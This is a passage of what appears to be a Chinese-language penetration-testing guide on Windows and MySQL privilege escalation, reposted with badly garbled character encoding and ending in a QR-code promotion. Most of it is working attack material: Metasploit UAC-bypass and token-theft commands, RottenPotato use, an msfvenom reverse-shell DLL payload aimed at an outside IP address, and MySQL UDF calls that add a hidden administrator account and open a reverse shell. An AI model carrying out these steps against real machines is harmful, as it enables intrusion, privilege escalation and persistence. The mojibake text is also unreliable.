å› æ­¤å½“æˆ‘ä»¬ä¿®æ”¹hkcuæ³¨å†Œè¡¨åï¼Œè¿è¡ŒComputerDefaults.exeå°±ä¼šå¾—åˆ°ä¸€ä¸ªbypass uacåçš„cmdï¼š  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXfwqXQDpzvS49icDsmMBZhNtmWoAuI7HMQSacicPPnUsKGrgib5GutWDLA/640?wx_fmt=jpeg&from=appmsg "")  
  
å½“ä¿®æ”¹HKCU\Software\Classes\ä¸‹çš„é”®å€¼æ—¶ï¼Œä¼šåŒæ­¥ä¿®æ”¹HKCRä¸‹é¢çš„é”®å€¼ã€‚  
  
å‚è€ƒï¼šhttps://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA  
##### MSFåˆ©ç”¨  
  
**Bypass uacææƒçš„MSFæ¨¡å—**  

```
use exploit/windows/local/bypassuac Â #è¯¥æ¨¡å—è¿è¡Œæ—¶ä¼šå› ä¸ºåœ¨ç›®æ ‡æœºä¸Šåˆ›å»ºå¤šä¸ªæ–‡ä»¶è€Œè¢«æ€æ¯’è½¯ä»¶è¯†åˆ«ï¼Œå› æ­¤é€šè¿‡è¯¥æ¨¡å—ææƒæˆåŠŸç‡å¾ˆä½ã€‚ å¯ä»¥è¿›è¡Œå¤šæ¬¡exploitï¼Œç¬¬ä¸€æ¬¡å¯èƒ½ä¸æˆåŠŸ
use exploit/windows/local/bypassuac_injection Â #è¯¥æ¨¡å—ç›´æ¥è¿è¡Œåœ¨å†…å­˜çš„åå°„DLLä¸­ï¼Œæ‰€ä»¥ä¸ä¼šæ¥è§¦ç›®æ ‡æœºå™¨çš„ç¡¬ç›˜ï¼Œä»è€Œé™ä½äº†è¢«æ€æ¯’è½¯ä»¶æ£€æµ‹å‡ºæ¥çš„æ¦‚ç‡ã€‚

```

  
MSFä¸­Bypassuacæ¨¡å—çš„ä½¿ç”¨å‰ææœ‰ä¸¤ä¸ªï¼š  
1. ä¸€æ˜¯ç³»ç»Ÿå½“å‰ç”¨æˆ·å¿…é¡»åœ¨ç®¡ç†å‘˜ç»„ä¸­ï¼Œ  
  
1. äºŒæ˜¯ç”¨æˆ·è´¦æˆ·æ§åˆ¶ç¨‹åºUACè®¾ç½®ä¸ºé»˜è®¤ï¼Œå³ â€œä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘â€ ã€‚  
  

```
use exploit/windows/local/bypassuac
set session 1
set lhost 0.0.0.0 Â  Â  Â  Â  Â 
set lport 24444 Â  Â  Â  Â  Â  Â  Â  Â #æœ¬åœ°ç›‘å¬çš„ç«¯å£ï¼Œéšä¾¿è®¾ç½®ä¸€ä¸ªæœªè¢«å ç”¨çš„ç«¯å£å³å¯
exploit

```

#### 6ã€ä»¤ç‰Œçªƒå–  
##### ä»¤ç‰Œç®€ä»‹  
  
æè¿°è¿›ç¨‹æˆ–è€…çº¿ç¨‹å®‰å…¨ä¸Šä¸‹æ–‡çš„ä¸€ä¸ªå¯¹è±¡ã€‚ä¸åŒçš„ç”¨æˆ·ç™»å½•è®¡ç®—æœºåï¼Œ éƒ½ä¼šç”Ÿæˆä¸€ä¸ªAccess Tokenï¼Œå®ƒæè¿°äº†ç”¨æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSIDï¼‰ã€æ‰€å±ç»„çš„SIDã€ç”¨æˆ·çš„æƒé™ã€ç™»å½•ä¿¡æ¯ç­‰ã€‚æ¯ä¸ªç”¨æˆ·ç™»å½•åˆ°ç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ªè®¿é—®ä»¤ç‰Œã€‚è¿™ä¸ªTokenåœ¨ç”¨æˆ·åˆ›å»ºè¿›ç¨‹æˆ–è€…çº¿ç¨‹æ—¶ä¼šè¢«ä½¿ç”¨ï¼Œä¸æ–­çš„æ‹·è´ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†Aç”¨æˆ·åˆ›å»ºä¸€ä¸ªè¿›ç¨‹è€Œè¯¥è¿›ç¨‹æ²¡æœ‰Bç”¨æˆ·çš„æƒé™ã€‚ä¸€èˆ¬ç”¨æˆ·åŒå‡»è¿è¡Œä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šæ‹·è´explorer.exeçš„Access Tokenã€‚è®¿é—®ä»¤ç‰Œåˆ†ä¸ºï¼š  
  
* æˆæƒä»¤ç‰Œï¼ˆDelegation tokenï¼‰ï¼šäº¤äº’å¼ä¼šè¯ç™»é™†ï¼ˆä¾‹ï¼šæœ¬åœ°ç”¨æˆ·ç™»é™†ã€ç”¨æˆ·æ¡Œé¢ç­‰ï¼‰  
  
* æ¨¡æ‹Ÿä»¤ç‰Œï¼ˆImpersonation tokenï¼‰ï¼šéäº¤äº’å¼ç™»é™†ï¼ˆä¾‹ï¼šnet use è®¿é—®å…±äº«æ–‡ä»¶ï¼‰  
  
ä¸¤ç§tokenåªæœ‰åœ¨ç³»ç»Ÿé‡å¯åæ‰ä¼šæ¸…é™¤ï¼›æˆæƒä»¤ç‰Œåœ¨ç”¨æˆ·æ³¨é”€åï¼Œè¯¥ä»¤ç‰Œä¼šå˜ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œä¾æ—§æœ‰æ•ˆã€‚  
  
åŒæ ·ä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼Œ**å½“å‰ç³»ç»Ÿä¸­çš„æŸä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹èƒ½è®¿é—®åˆ°ä»€ä¹ˆæ ·çš„ç³»ç»Ÿèµ„æº,å®Œå…¨å–å†³äºä½ å½“å‰è¿›ç¨‹æ˜¯æ‹¿ç€è°çš„ä»¤ç‰Œã€‚**  
  
é»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åˆ—ä¸¾ä»¤ç‰Œï¼Œåªèƒ½åˆ—ä¸¾å‡ºå½“å‰ç”¨æˆ·å’Œæ¯”å½“å‰ç”¨æˆ·æƒé™æ›´ä½ç”¨æˆ·çš„ä»¤ç‰Œã€‚ä»¤ç‰Œçš„æ•°é‡å–å†³äºå½“å‰shellçš„è®¿é—®çº§åˆ«ï¼Œå¦‚æœå½“å‰çš„shellæ˜¯administratoræˆ–è€…æ˜¯systemï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ç³»ç»Ÿä¸­çš„æ‰€æœ‰çš„ä»¤ç‰Œã€‚  
  
åœ¨Windowså‘½ä»¤è¡Œä¸­ï¼Œå¯ä»¥ä½¿ç”¨å¦‚
```
whoami /all
```

  
å‘½ä»¤æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„å®‰å…¨ä»¤ç‰Œä¿¡æ¯ï¼Œæˆ–è€…ä½¿ç”¨æ›´é«˜çº§çš„å·¥å…·å¦‚ Sysinternalså¥—ä»¶ä¸­çš„
```
tokenmon
```

  
æ¥ç›‘è§†ä»¤ç‰Œçš„åˆ›å»ºå’Œé”€æ¯ã€‚  
  
**æ³¨æ„ï¼š**é¦–å…ˆéœ€è¦å°†æœ¨é©¬ä¸Šä¼ è‡³éœ€è¦ææƒçš„æœåŠ¡å™¨ä¸­ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤è¿›è¡Œä»¤ç‰Œçªƒå–ææƒã€‚  

```
use incognito
list_tokens -u Â  Â  Â  Â  Â  #åˆ—å‡ºæœ‰çš„ä»¤ç‰Œ
impersonate_token &#34;NT AUTHORITY\SYSTEM&#34; #çªƒå–systemä»¤ç‰Œ

```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXaXOhRtEnHbkjEVLTGvvuMT5mMrTY9TKCPWDBjev4lJoxjeULNVND4Q/640?wx_fmt=jpeg&from=appmsg "")  
#### 7ã€çƒ‚åœŸè±†ææƒ  
  
å‚è€ƒæ–‡ç«   
  
**ä¸€èˆ¬çƒ‚åœŸè±†éœ€è¦æ¥é…åˆä»¤ç‰Œçªƒå–æ¥è¿›è¡Œææƒ**  
  
**æ³¨æ„ï¼ˆé‡ç‚¹ï¼šç”¨çƒ‚åœŸè±†é…åˆæœ¬åœ°ç”¨æˆ·ææƒæ˜¯æˆåŠŸä¸äº†çš„ï¼Œå¿…é¡»æ˜¯webæƒé™æˆ–æ•°æ®åº“æƒé™ï¼‰**  
1. å•çº¯ä»¤ç‰Œçªƒå–ï¼šWebæƒé™æˆ–æœ¬åœ°æƒé™  
  
1. é…åˆçƒ‚åœŸè±†ææƒï¼šwebæƒé™æˆ–æ•°æ®åº“ç­‰æƒé™  
  
##### åŸç†  
1. æ¬ºéª— "NT AUTHORITY\SYSTEM"è´¦æˆ·é€šè¿‡NTLMè®¤è¯åˆ°æˆ‘ä»¬æ§åˆ¶çš„TCPç»ˆç«¯ã€‚  
  
1. å¯¹è¿™ä¸ªè®¤è¯è¿‡ç¨‹ä½¿ç”¨ä¸­é—´äººæ”»å‡»ï¼ˆNTLMé‡æ”¾ï¼‰ï¼Œä¸º"NT AUTHORITY\SYSTEM"è´¦æˆ·æœ¬åœ°åå•†ä¸€ä¸ªå®‰å…¨ä»¤ç‰Œã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡ä¸€ç³»åˆ—çš„Windows APIè°ƒç”¨å®ç°çš„ã€‚  
  
1. æ¨¡ä»¿è¿™ä¸ªä»¤ç‰Œã€‚åªæœ‰å…·æœ‰"æ¨¡ä»¿å®‰å…¨ä»¤ç‰Œæƒé™"çš„è´¦æˆ·æ‰èƒ½å»æ¨¡ä»¿åˆ«äººçš„ä»¤ç‰Œã€‚ä¸€èˆ¬å¤§å¤šæ•°çš„æœåŠ¡å‹è´¦æˆ·ï¼ˆIISã€MSSQLç­‰ï¼‰æœ‰è¿™ä¸ªæƒé™ï¼Œå¤§å¤šæ•°ç”¨æˆ·çº§çš„è´¦æˆ·æ²¡æœ‰è¿™ä¸ªæƒé™ã€‚  
  
###### NTLM  

```
NTLMæ˜¯NT LAN Managerçš„ç¼©å†™ï¼Œè¿™ä¹Ÿè¯´æ˜äº†åè®®çš„æ¥æºã€‚NTLMæ˜¯æŒ‡ telnet çš„ä¸€ç§éªŒè¯èº«ä»½æ–¹å¼ï¼Œå³é—®è¯¢/åº”ç­”èº«ä»½éªŒè¯åè®®ï¼Œæ˜¯ Windows NT æ—©æœŸç‰ˆæœ¬çš„æ ‡å‡†å®‰å…¨åè®®ï¼ŒWindows 2000 æ”¯æŒ NTLM æ˜¯ä¸ºäº†ä¿æŒå‘åå…¼å®¹ã€‚Windows 2000å†…ç½®ä¸‰ç§åŸºæœ¬å®‰å…¨åè®®ä¹‹ä¸€ã€‚

```


```
meterpreter > upload /root/Rottenpotato/rottenpotato.exe

meterpreter > execute -HC -f rottenpotato.exe

meterpreter > use incognito

meterpreter > list_tokens -u

ä¼šå‘ç°ä»¤ç‰Œåˆ—è¡¨é‡Œé¢å­˜åœ¨systemçš„ä»¤ç‰Œï¼Œåœ¨ç”¨systemçš„ä»¤ç‰Œè¿›è¡Œææƒ

```

#### 8ã€å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´  
  
æ¼æ´åœ°å€  
  
**ä¸€ã€æ¼æ´åŸç†**  
  
å½“ç³»ç»Ÿç®¡ç†å‘˜é…ç½®WindowsæœåŠ¡æ—¶ï¼Œä»–ä»¬å¿…é¡»æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæˆ–è€…è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ã€‚  
  
å½“WindowsæœåŠ¡è¿è¡Œæ—¶ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹ä¸¤ç§æƒ…å†µä¹‹ä¸€ã€‚å¦‚æœç»™å‡ºäº†å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”å¼•ç”¨äº†å®Œæ•´è·¯å¾„ï¼Œåˆ™ç³»ç»Ÿä¼šæŒ‰å­—é¢è§£é‡Šå®ƒå¹¶æ‰§è¡Œã€‚ä½†æ˜¯ï¼Œå¦‚æœæœåŠ¡çš„äºŒè¿›åˆ¶è·¯å¾„æœªåŒ…å«åœ¨å¼•å·ä¸­ï¼Œåˆ™æ“ä½œç³»ç»Ÿå°†ä¼šæ‰§è¡Œæ‰¾åˆ°çš„ç©ºæ ¼åˆ†éš”çš„æœåŠ¡è·¯å¾„çš„ç¬¬ä¸€ä¸ªå®ä¾‹ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXzv1WbFqXrrqRf5hwr7EaByB0tJfWhJBH0mzfumxNDJEEMNGCIclFog/640?wx_fmt=jpeg&from=appmsg "")  
  
**è·¯å¾„æ²¡æœ‰åŒ…å«åœ¨å¼•å·ä¸­ï¼ŒæœåŠ¡ä¼šæŒ‰ç…§ä»¥ä¸‹é¡ºåºä¾æ¬¡æ‰§è¡Œ**  

```
c:\program.exe
c:\program files.exe
c:\program files (x86)\grasssoft\macro.exe
c:\program files (x86)\grasssoft\macro expert\MacroService.exe

```

  
**å‡å¦‚å­˜åœ¨æ¼æ´è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥å°†msfæœ¨é©¬æ”¾åˆ°ä¸Šé¢çš„è·¯å¾„ä¸‹ï¼Œç„¶åé‡å¯æœºå™¨ï¼Œæ­¤æ—¶ï¼Œåå¼¹å›æ¥çš„shellï¼Œåˆ™æ˜¯ä¸€ä¸ªsystemçš„shell**  
  
ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿä¸­é”™è¯¯é…ç½®çš„è·¯å¾„  

```
wmic service get name,displayname,pathname,startmode |findstr /i &#34;Auto&#34; |findstr /i /v &#34;C:\Windows\\&#34; |findstr /i /v &#34;&#34;&#34;


1ã€wmic service get name,displayname,pathname,startmodeï¼šè¿™ä¸ªå‘½ä»¤è¡Œä½¿ç”¨Windows Management Instrumentation Command-Line (WMIC)æ¥è·å–æœåŠ¡çš„åç§°ã€æ˜¾ç¤ºåç§°ã€è·¯å¾„åç§°å’Œå¯åŠ¨æ¨¡å¼ã€‚
2ã€|findstr /i &#34;Auto&#34;ï¼šè¿™ä¸ªç®¡é“å‘½ä»¤ä½¿ç”¨findstrå·¥å…·æ¥è¿‡æ»¤å‡ºé‚£äº›å¯åŠ¨æ¨¡å¼ä¸ºâ€œè‡ªåŠ¨â€çš„æœåŠ¡ã€‚/iæ ‡å¿—è¡¨ç¤ºå¿½ç•¥å¤§å°å†™ã€‚
3ã€|findstr /i /v &#34;C:\Windows\\&#34;ï¼šè¿™ä¸ªç®¡é“å‘½ä»¤è¿›ä¸€æ­¥è¿‡æ»¤å‡ºé‚£äº›è·¯å¾„åç§°ä¸åŒ…å«â€œC:\Windows\â€çš„æœåŠ¡ã€‚/væ ‡å¿—è¡¨ç¤ºæ’é™¤åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„è¡Œã€‚

```

#### 9ã€DLLåŠ«æŒ  
##### åŸç†ï¼š  
  
Windowsç¨‹åºå¯åŠ¨çš„æ—¶å€™éœ€è¦DLLã€‚å¦‚æœè¿™äº›DLL ä¸å­˜åœ¨ï¼Œåˆ™å¯ä»¥é€šè¿‡åœ¨åº”ç”¨ç¨‹åºè¦æŸ¥æ‰¾çš„ä½ç½®æ”¾ç½®æ¶æ„DLLæ¥ææƒã€‚é€šå¸¸ï¼ŒWindowsåº”ç”¨ç¨‹åºæœ‰å…¶é¢„å®šä¹‰å¥½çš„æœç´¢DLLçš„è·¯å¾„ï¼Œå®ƒä¼šæ ¹æ®ä¸‹é¢çš„é¡ºåºè¿›è¡Œæœç´¢ï¼š  
  
1ã€åº”ç”¨ç¨‹åºåŠ è½½çš„ç›®å½•  
  
2ã€C:\Windows\System32  
  
3ã€C:\Windows\System  
  
4ã€C:\Windows  
  
5ã€å½“å‰å·¥ä½œç›®å½•Current Working Directoryï¼ŒCWD  
  
6ã€åœ¨PATHç¯å¢ƒå˜é‡çš„ç›®å½•ï¼ˆå…ˆç³»ç»Ÿåç”¨æˆ·ï¼‰  
  
è¿‡ç¨‹ï¼šä¿¡æ¯æ”¶é›†-è¿›ç¨‹è°ƒè¯•-åˆ¶ä½œdllå¹¶ä¸Šä¼ -æ›¿æ¢dll-å¯åŠ¨åº”ç”¨åæˆåŠŸ  
  
msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll >/opt/test.dll  
  
**å¸¸ç”¨ç³»ç»Ÿæ¼æ´**  
CVE  
  
#Windows10  
  
CVE-2020-0796 https://www.cnblogs.com/-chenxs/p/12618678.html  
  
#Windows7/2008  
  
CVE-2018-8120 https://www.cnblogs.com/-mo-/p/11404598.html  
  
#Windows7/8ã€2008/2012/2016  
  
CVE-2017-0213 https://www.cnblogs.com/-mo-/p/11446144.html  
  
#SQL Serverã€IISé€šæ€ (é’ˆå¯¹æœ¬åœ°ç”¨æˆ·çš„ï¼Œä¸èƒ½ç”¨äºåŸŸç”¨æˆ·)  
  
MS16-075(RottenPotato) https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075  
## æ•°æ®åº“ææƒ  
  
åœ¨åˆ©ç”¨ç³»ç»Ÿæº¢å‡ºæ¼æ´æ— æœçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é‡‡ç”¨æ•°æ®åº“è¿›è¡Œææƒã€‚  
  
**æ•°æ®åº“ææƒçš„å‰ææ¡ä»¶ï¼š**  
  
1ã€æœåŠ¡å™¨å¼€å¯æ•°æ®åº“æœåŠ¡  
  
2ã€è·å–åˆ°æœ€é«˜æƒé™ç”¨æˆ·å¯†ç   
  
(é™¤Accessæ•°æ®åº“å¤–ï¼Œå…¶ä»–æ•°æ®åº“åŸºæœ¬éƒ½å­˜åœ¨æ•°æ®åº“ææƒçš„å¯èƒ½)  
  
3ã€secure_file_privçš„å€¼ä¸ºç©º  
  
4ã€å¦‚æœmysqlç‰ˆæœ¬å¤§äº5.1ï¼Œudf.dllæ–‡ä»¶å¿…é¡»æ”¾ç½®åœ¨mysqlå®‰è£…ç›®å½•çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹/  
  
5ã€å¦‚æœmysqlç‰ˆæœ¬å°äº5.1ï¼Œ udf.dllæ–‡ä»¶åœ¨windows server 2003ä¸‹æ”¾ç½®äºc:\windows\system32ç›®å½•ï¼Œåœ¨windows server 2000ä¸‹æ”¾ç½®åœ¨c:\winnt\system32ç›®å½•ã€‚  

```
show variables like 'plugin%'; Â  ã€æŸ¥çœ‹ plugin ç›®å½•ã€‘
show global variables like 'secure%'; ã€æŸ¥çœ‹secure_file_privã€‘
select @@basedir; ã€æŸ¥çœ‹mysqlå®‰è£…è·¯å¾„ã€‘
show variables like '%version_%'; ã€ç¡®å®šå¹³å°æ˜¯64ä½è¿˜æ˜¯32ä½ã€‘

```

#### 1ã€Mysql_udfææƒ  
##### åŸç†  
  
ç”±äºMySQLæ”¯æŒUDFï¼ˆuser define functionï¼‰ï¼Œæ”¯æŒæˆ‘ä»¬è‡ªå®šä¹‰å‡½æ•°æ¥æ‰©å±•åŠŸèƒ½ã€‚å½“æˆ‘ä»¬åˆ›å»ºå¸¦æœ‰è°ƒç”¨cmdå‡½æ•°çš„â€™udf.dllâ€™(åŠ¨æ€é“¾æ¥åº“)ã€‚å½“æˆ‘ä»¬æŠŠâ€™udf.dllâ€™å¯¼å‡ºæŒ‡å®šæ–‡ä»¶å¤¹å¼•å…¥Mysqlæ—¶ï¼Œå…¶ä¸­çš„è°ƒç”¨å‡½æ•°æ‹¿å‡ºæ¥å½“ä½œmysqlçš„å‡½æ•°ä½¿ç”¨ã€‚è¿™æ ·æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°æ‰è¢«å½“ä½œæœ¬æœºå‡½æ•°æ‰§è¡Œã€‚  

```
å¯¼å…¥
CREATE FUNCTION example_function RETURNS INTEGER SONAME 'udf.dll';

```

##### udf.dllå¯¼å‡ºæŒ‡å®šæ–‡ä»¶å¤¹  
  
å½“ MySQL< 5.1 ç‰ˆæœ¬æ—¶ï¼Œå°† .dll æ–‡ä»¶å¯¼å…¥åˆ° c:\windows æˆ–è€… c:\windows\system32 ç›®å½•ä¸‹ã€‚  
  
å½“ MySQL> 5.1 ç‰ˆæœ¬æ—¶ï¼Œå°† .dll æ–‡ä»¶å¯¼å…¥åˆ° MySQL Server 5.xx\lib\plugin ç›®å½•ä¸‹ (lib\pluginç›®å½•é»˜è®¤ä¸å­˜åœ¨ï¼Œéœ€è‡ªè¡Œåˆ›å»º)ã€‚  
##### pluginç›®å½•åˆ›å»ºæ–¹å¼  
  
é€šè¿‡èœåˆ€è¿æ¥åˆ›å»º  
  
é€šè¿‡mysqlè¯­å¥åˆ›å»º  
##### Windows/linuxè·å–udfæ–‡ä»¶ï¼šä½¿ç”¨sqlmapç”Ÿæˆ  
  
**1ã€Windowsä¸‹è¿›å…¥sqlmapå®‰è£…ç›®å½•ä¸‹çš„extra\cloakç›®å½•ä¸‹ä½¿ç”¨cloak.pyå·¥å…·**  

```
python cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll

```

  
sqlmapçš„dataç›®å½•ä¸‹udfçš„åŠ å¯†æ–‡ä»¶ï¼Œä½¿ç”¨ä¸Šè¿°å‘½ä»¤è§£å¯†ä¸€ä¸‹å³å¯è·å¾—udf.dllã€‚  
  
**2ã€Kaliä¸‹è·å–udfæ–‡ä»¶**  
  
å°†Kaliç³»ç»Ÿä¸­sqlmapè‡ªå¸¦çš„udfææƒåº“æ–‡ä»¶è¿›è¡Œè§£ç ã€‚ åœ¨Kaliæ”»å‡»æœºä¸Šï¼Œå¯åŠ¨ç»ˆç«¯ï¼Œä¾æ¬¡è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š  

```
cd /usr/share/sqlmap/extra/cloak/ ã€è¿›å…¥cloakç›®å½•ã€‘
python cloak.py -d -i /usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so
ã€å°†lib_mysqludf_sys.so_è¿›è¡Œè§£ç ã€‘

```

  
ä¹‹ååœ¨/usr/share/sqlmap/udf/mysql/linux/64  
  
ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªåä¸ºâ€œlib_mysqludf_sys.soâ€çš„è§£ç åçš„soæ–‡ä»¶  
  
å°†dllæ–‡ä»¶å¤åˆ¶åˆ°æŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡ŒSQLå‘½ä»¤ï¼š  

```
sys_evalï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¹¶å°†è¾“å‡ºè¿”å›ã€‚
sys_execï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¹¶å°†é€€å‡ºç è¿”å›ã€‚
sys_getï¼Œè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚
sys_setï¼Œåˆ›å»ºæˆ–ä¿®æ”¹ä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚
ä¸€èˆ¬ç”¨äºåˆ›å»ºæ–°ç”¨æˆ·ç»´æŒæƒé™




create function cmdshell returns string soname 'moonudf.dll' ã€åˆ›å»ºcmdshellã€‘
select cmdshell('net user $darkmoon 123456 /add & net localgroup administrators $darkmoon /add') Â  ã€æ·»åŠ è¶…çº§ç®¡ç†å‘˜ã€‘
select cmdshell('net user') Â ã€æŸ¥çœ‹ç”¨æˆ·ã€‘
select cmdshell('netstat -an') Â ã€æŸ¥çœ‹ç«¯å£ã€‘
select name from mysql.func Â  ã€æŸ¥çœ‹åˆ›å»ºå‡½æ•°ã€‘
delete from mysql.func where name='cmdshell' Â ã€åˆ é™¤cmdshellã€‘
create function backshell returns string soname 'moonudf.dll' ã€åˆ›å»ºåå¼¹å‡½æ•°ã€‘
select backshell('192.168.157.130',12345) Â  Â ã€æ‰§è¡Œåå¼¹ã€‘
delete from mysql.func where name='backshell' Â ã€åˆ é™¤backshellã€‘
```

  
è½¬è‡ªï¼š  
https://www.freebuf.com/articles/vuls/430677.html  
  
  
****  
**æ–‡æœ«ç¦åˆ©**  
##   
## ç°åœ¨å·²ç»æ­¥å…¥2025å¹´äº†ï¼Œä¸å°‘å°ä¼™ä¼´åœ¨è€ƒè™‘å…¥è¡Œå­¦ä¹ ç½‘ç»œå®‰å…¨ã€‚  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAmTHoVHrG8PppyYU8FpGmLJDLOPiax3pqwnq9hFjDSMH4cpYptL3h071PkP0jkoR5ib2Ksfia8VFnicmQ/640?wx_fmt=png&from=appmsg "")  
  
ä¸ºäº†å¸®åŠ©å¤§å®¶æ—©æ—¥ä¹ å¾—ç½‘ç»œå®‰å…¨æ ¸å¿ƒçŸ¥è¯†ï¼Œå¿«é€Ÿå…¥è¡Œç½‘ç»œå®‰å…¨åœˆï¼Œ**ç»™å¤§å®¶æ•´ç†äº†ä¸€å¥—ã€2025æœ€æ–°ç½‘å®‰èµ„æ–™ã€‘**  
**ç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆ****å¿…å¤‡æŠ€èƒ½èµ„æ–™åŒ…**  
ï¼ˆæ–‡æœ«ä¸€é”®é¢†å–ï¼‰**ï¼Œå†…å®¹æœ‰å¤šè¯¦å®ä¸°å¯Œçœ‹ä¸‹å›¾ï¼**  
  
**Webå®‰å…¨**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkcvc41LgmeFn1B18QpgBZFBODrmsTGnPTOibdIT9B5eFLTHVIgWzYafxGAesmYnfzrz52xwV3Bjhw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**æ¸—é€æµ‹è¯•**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkcvc41LgmeFn1B18QpgBZFVKWl2cLRTq7x9haKJerUZNO0YMhiaO8ibN1jjV0qxNLEvRKMfR90eNjQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**å®‰å…¨é¢è¯•é¢˜**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkcvc41LgmeFn1B18QpgBZFgrmaDLaYT1yV5lst9tKC72QrYjd5I8IN7kcOZIZSfQJJz8MdX6a1uA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**ä»£ç å®¡è®¡**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkcvc41LgmeFn1B18QpgBZFxmUkTNP1iagssZL5zkjID8hibpZsRCj1OnEb4x7ZYWqpiaymSjc8O7vSQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**HVVæ–‡æ¡£**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkcvc41LgmeFn1B18QpgBZFMD4XeWiaQgOBDgFjkQRogf6djmGx3YRcCCSLYGMY1e4DQejgibv7fffQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**çº¢é˜Ÿç¬”è®°**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkcvc41LgmeFn1B18QpgBZFVZS1mB4MKAo4FoMBGyVSzq38ZXEKJCjZVaTsFtLE7tIJ3zbRWF5xeA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**å…¥é—¨è§†é¢‘**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/O9D0kmTL9EgxtiaXGtk7loXV41e8AXiaORJMhqFbrtcfHvJWTia6ME2oSI9msVYJu79uCicb7foufuibEHaVg32XnWw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/NUwbCdTuQQxsJibSZGyA8akP9TVyJfPcpJ4uIZJDj3akRUfv6cNbnksGJQsibq1aH8iaGDic7TvOaSwNGXLdQ8PC9A/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**ä»¥ä¸Šæ‰€æœ‰èµ„æ–™è·å–è¯·æ‰«ç **  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkwcjtOtVXODCkPibWO4Py9FP1ESE26vHHMLwfyYA6zWj96VL7AsPYcyvHL43536JMIDNWibIdicAjRw/640?wx_fmt=png&from=appmsg "")  
  
è¯†åˆ«ä¸Šæ–¹äºŒç»´ç   
  
å¤‡æ³¨ï¼š2025å®‰å…¨åˆé›†  
  
100%å…è´¹é¢†å–  
  
ï¼ˆæ˜¯  
æ‰«ç é¢†å–  
ï¼Œä¸æ˜¯åœ¨å…¬ä¼—å·åå°å›å¤ï¼Œ  
åˆ«çœ‹é”™äº†å“¦ï¼‰  
  
  
  
